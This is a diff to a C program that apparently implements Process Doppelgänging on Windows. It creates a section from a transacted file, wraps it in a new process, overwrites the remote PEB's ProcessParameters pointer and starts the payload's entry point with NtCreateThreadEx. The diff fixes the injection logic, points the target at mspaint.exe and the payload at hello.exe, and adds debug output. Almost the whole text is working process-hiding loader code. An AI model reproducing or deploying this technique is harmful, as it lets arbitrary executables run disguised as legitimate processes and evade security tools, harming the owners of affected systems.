@@ -7,6 +7,8 @@
 
 #pragma comment(lib, "KtmW32.lib")
 
+#define NtCurrentProcess() ((HANDLE) - 1)
+
 void fatal_error(char *msg)
 {
 	printf("[-] Error : %s\n", msg);
@@ -57,13 +59,15 @@ LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 	return lpPayloadBuffer;
 }
 
-ULONG_PTR get_entry_point(BYTE *lpPayloadBuffer, PPEB remotePeb)
+ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, PPEB remotePeb)
 {
 	IMAGE_DOS_HEADER *dosHeader = NULL;
 	IMAGE_NT_HEADERS64 *peHeader = NULL;
-	ULONG_PTR entryPoint = NULL;
+	ULONGLONG entryPoint = NULL;
+	ULONGLONG imageBase = NULL;
+	DWORD offset = 0;
 
-	// NT header is located at base_dos_header + offset_PE_header (represented by
+	// NT header is located at base_dos_header + offset_PE_header (roffsetresented by
 	// 'e_lfanew'.
 	// Source : PE file format compendium 1.1 (by Goppit).
 	dosHeader = (IMAGE_DOS_HEADER*)lpPayloadBuffer;
@@ -77,18 +81,22 @@ ULONG_PTR get_entry_point(BYTE *lpPayloadBuffer, PPEB remotePeb)
 	// The entry point address is the addition of the base address of the process 
 	// (got from the PEB structure filled with NtQueryInformationProcess, the one 
 	// present in the optional header is just the preferred base address and can 
-	// be different from the real base address) and the offset of the entry point 
-	// present in the OptionalHeader.
-	entryPoint = remotePeb->ImageBaseAddress;
-	entryPoint += peHeader->OptionalHeader.AddressOfEntryPoint;
+	// be different from the real base address) and the offset of the entry point
+	// (from the image base) present in the OptionalHeader.
+	imageBase = (ULONGLONG)remotePeb->ImageBaseAddress;
+	offset = peHeader->OptionalHeader.AddressOfEntryPoint;
+	printf("imageBase : %p\n", imageBase);
+	printf("offset : %d\n", offset);
+
+	entryPoint = imageBase + offset;
 
 	return entryPoint;
 }
 
 int main(void)
 {
-	LPWSTR targetProcess = L"C:\\Users\\wvbox\\Desktop\\calc_64.exe";
-	LPWSTR payload = L"C:\\Users\\wvbox\\Desktop\\procexp64.exe";
+	LPWSTR targetProcess = L"C:\\Users\\wvbox\\Desktop\\mspaint.exe";
+	LPWSTR payload = L"C:\\Users\\wvbox\\Desktop\\hello.exe";
 	HMODULE hNtdll = NULL;
 	HANDLE hTransaction = NULL;
 	HANDLE hTransactedFile = NULL;
@@ -101,22 +109,24 @@ int main(void)
 	DWORD payloadSize = 0;
 	DWORD bytesWritten = 0;
 
-	NTSTATUS status = 0;
+	PROCESS_BASIC_INFORMATION pbi = { '\0' };
+	LPTHREAD_START_ROUTINE remoteEntryPoint = NULL;
+	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
+	ULONGLONG offset = 0;
+	LPVOID remoteImageBase = NULL;
+	UNICODE_STRING uPath = { '\0' };
+	UNICODE_STRING uTitle = { '\0' };
+	UNICODE_STRING uDirectory = { '\0' };
+
+	NTSTATUS status = -1;
 	NT_CREATE_SECTION _ntCreateSection = NULL;
 	NT_CREATE_PROCESS_EX _ntCreateProcessEx = NULL;
 	NT_CREATE_THREAD_EX _ntCreateThreadEx = NULL;
-	
-	RTL_CREATE_PROCESS_PARAMETERS _rtlCreateProcessParameters = NULL;
-	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
-	
-	RTL_INIT_UNICODE_STRING _rtlInitUnicodeString = NULL;
-	UNICODE_STRING ustr = {'\0'};
-	
+	RTL_CREATE_PROCESS_PARAMETERS_EX _rtlCreateProcessParametersEx = NULL;
 	NT_QUERY_INFORMATION_PROCESS _ntQueryInformationProcess = NULL;
 	NT_WRITE_VIRTUAL_MEMORY _ntWriteVirtualMemory = NULL;
 	NT_READ_VIRTUAL_MEMORY _ntReadVirtualMemory = NULL;
-	PROCESS_BASIC_INFORMATION pbi = { '\0' };
-	LPTHREAD_START_ROUTINE remoteEntryPoint = NULL;
+	RTL_INIT_UNICODE_STRING _rtlInitUnicodeString = NULL;
 
 	hNtdll = GetModuleHandle("ntdll.dll");
 
@@ -151,7 +161,7 @@ int main(void)
 	// Create the section in the target process.
 	_ntCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
 	printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
-	status = 0;
+	status = -1;
 	if (_ntCreateSection)
 	{
 		status = _ntCreateSection(
@@ -174,14 +184,14 @@ int main(void)
 	// Create a new process to wrap the previously created section.
 	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtdll, "NtCreateProcessEx");
 	printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
-	status = 0;
+	status = -1;
 	if (_ntCreateProcessEx)
 	{
 		status = _ntCreateProcessEx(
 			&hProcess,
 			PROCESS_ALL_ACCESS,
 			NULL,
-			GetCurrentProcess(),
+			NtCurrentProcess(),
 			PS_INHERIT_HANDLES,
 			hSection,
 			NULL,
@@ -193,23 +203,25 @@ int main(void)
 		fatal_error("NtCreateProcessEx() failed.");
 
 	// Create the parameters for that process.
-	_rtlCreateProcessParameters = (RTL_CREATE_PROCESS_PARAMETERS)GetProcAddress(hNtdll, "RtlCreateProcessParameters");
+	_rtlCreateProcessParametersEx = (RTL_CREATE_PROCESS_PARAMETERS_EX)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
 	_rtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(hNtdll, "RtlInitUnicodeString");
-	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParameters);
+	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParametersEx);
 	printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);
 
-	_rtlInitUnicodeString(&ustr, targetProcess);
-	status = 0;
-	if (_rtlCreateProcessParameters)
+	_rtlInitUnicodeString(&uPath, targetProcess);
+	_rtlInitUnicodeString(&uDirectory, L"C:\\windows\\system32");
+	_rtlInitUnicodeString(&uTitle, L"mspaint.exe");
+	status = -1;
+	if (_rtlCreateProcessParametersEx)
 	{
-		status = _rtlCreateProcessParameters(
+		status = _rtlCreateProcessParametersEx(
 			&processParameters,
-			&ustr,
+			&uPath,
+			&uDirectory,
+			&uDirectory,
+			&uPath,
 			NULL,
-			NULL,
-			&ustr,
-			NULL,
-			NULL,
+			&uTitle,
 			NULL,
 			NULL,
 			NULL,
@@ -223,7 +235,7 @@ int main(void)
 	// process parameters pointer into it.
 	remoteProcParams = VirtualAllocEx(
 		hProcess,
-		(LPVOID)processParameters,
+		processParameters,
 		processParameters->Length,
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_READWRITE
@@ -234,22 +246,19 @@ int main(void)
 	// Write the parameters to the remote process.
 	_ntWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
 	printf("Address of NtWriteVirtualMemory() : %p\n", _ntWriteVirtualMemory);
-	status = 0;
-	if (_ntWriteVirtualMemory)
-	{
-		status = _ntWriteVirtualMemory(
-			hProcess,
-			remoteProcParams,	// TODO : replace by processParameters?
-			processParameters,
-			processParameters->Length,
-			NULL
-		);
-	}
+	status = _ntWriteVirtualMemory(
+		hProcess,
+		processParameters,
+		processParameters,
+		processParameters->Length,
+		NULL
+	);
 	if (STATUS_SUCCESS != status)
 		fatal_error("WriteProcessMemory(processParameters) failed.");
 	
 	// Get remote process' PEB address.
 	_ntQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+	status = -1;
 	if (_ntQueryInformationProcess)
 	{
 		status = _ntQueryInformationProcess(
@@ -260,11 +269,13 @@ int main(void)
 			NULL
 		);
 	}
+	if (STATUS_SUCCESS != status)
+		fatal_error("NtQueryProcessInformation() failed.");
 
 	// Read the memory of the target process to be able to fetch its image base address.
 	_ntReadVirtualMemory = (NT_READ_VIRTUAL_MEMORY)GetProcAddress(hNtdll, "NtReadVirtualMemory");
 	printf("Address of NtReadVirtualMemory() : %p\n", _ntReadVirtualMemory);
-	status = 0;
+	status = -1;
 	if (_ntReadVirtualMemory)
 	{
 		status = _ntReadVirtualMemory(
@@ -277,24 +288,39 @@ int main(void)
 	}
 	if (STATUS_SUCCESS != status)
 		fatal_error("ReadProcessMemory() failed.");
-
-	printf("DEBUG : %p\n", pbi.PebBaseAddress);
+	printf("remotePeb.ImageBaseAddress : %p\n", remotePeb.ImageBaseAddress);
 
 	// Overwrite remote process' ProcessParameters pointer to point to the one we 
 	// created.
-	status = 0;
-	if (_ntWriteVirtualMemory)
+	printf("remotePeb.ProcessParameters (before) : %p\n", remotePeb.ProcessParameters);
+	offset = (ULONGLONG)&remotePeb.ProcessParameters - (ULONGLONG)&remotePeb;
+	remoteImageBase = (LPVOID) ( (ULONGLONG)pbi.PebBaseAddress + offset);
+	status = _ntWriteVirtualMemory (
+		hProcess,
+		remoteImageBase,
+		&processParameters,
+		sizeof(PVOID),
+		NULL
+	);
+	if (STATUS_SUCCESS != status)
+		fatal_error("NtWriteVirtualMemory(&processParameters) failed.");
+
+	// --------------- DEBUG --------------- //
+	status = -1;
+	if (_ntReadVirtualMemory)
 	{
-		status = _ntWriteVirtualMemory (
+		status = _ntReadVirtualMemory(
 			hProcess,
-			&remotePeb.ProcessParameters,	// TODO : Not the right place to write!
-			&processParameters,
-			sizeof(PVOID),
+			pbi.PebBaseAddress,
+			&remotePeb,
+			sizeof(PEB),
 			NULL
 		);
 	}
 	if (STATUS_SUCCESS != status)
-		fatal_error("NtWriteVirtualMemory(&processParameters) failed.");
+		fatal_error("ReadProcessMemory() failed.");
+	printf("remotePeb.ProcessParameters (after) : %p\n", remotePeb.ProcessParameters);
+	// ------------------------------------- //
 
 	// Get remote process' entry point to let the main thread knows where to start.
 	remoteEntryPoint = (LPTHREAD_START_ROUTINE)get_entry_point(lpPayloadBuffer, &remotePeb);
@@ -307,7 +333,7 @@ int main(void)
 	{
 		status = _ntCreateThreadEx(
 			&hThread,
-			THREAD_ALL_ACCESS,
+			GENERIC_ALL, //THREAD_ALL_ACCESS,
 			NULL,
 			hProcess,
 			remoteEntryPoint,
@@ -321,10 +347,6 @@ int main(void)
 	}
 	if (STATUS_SUCCESS != status)
 		fatal_error("NtCreateThreadEx() failed.");
-
-	ResumeThread(hThread);
-
-	getchar();
 
 	return 0;
 }
